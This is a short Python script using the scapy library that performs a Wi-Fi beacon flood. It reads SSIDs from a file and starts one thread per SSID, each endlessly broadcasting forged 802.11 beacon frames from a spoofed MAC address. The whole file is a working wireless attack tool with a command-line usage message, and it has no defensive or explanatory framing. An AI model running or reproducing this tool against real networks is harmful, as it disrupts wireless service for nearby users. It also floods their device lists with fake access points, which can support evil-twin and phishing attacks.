from scapy.all import *
import sys
import threading

def beacon_flood(iface, netSSID):
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2='bd:ac:ef:87:98:64', addr3='bd:ac:ef:87:98:64')
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
    rsn = Dot11EltRSN()
    frame = RadioTap()/dot11/beacon/essid/rsn
    sendp(frame, iface=iface, inter=0.100, loop=1)

class Worker(threading.Thread):
    def __init__(self, interface, ssid):
        super().__init__()
        self.interface = interface
        self.ssid = ssid

    def run(self):
        print("interface: " + self.interface + " / SSID: " + self.ssid)
        beacon_flood(self.interface, self.ssid)


if len(sys.argv) < 3:
    print("syntax : beacon-flood <interface> <ssid-list-file>\nsample : beacon-flood mon0 ssid-list.txt")
    exit()

f = open(sys.argv[2], 'r')
while True:
    line = f.readline()
    if not line: break
    t = Worker(sys.argv[1], line[:-1])
    t.start()

f.close()
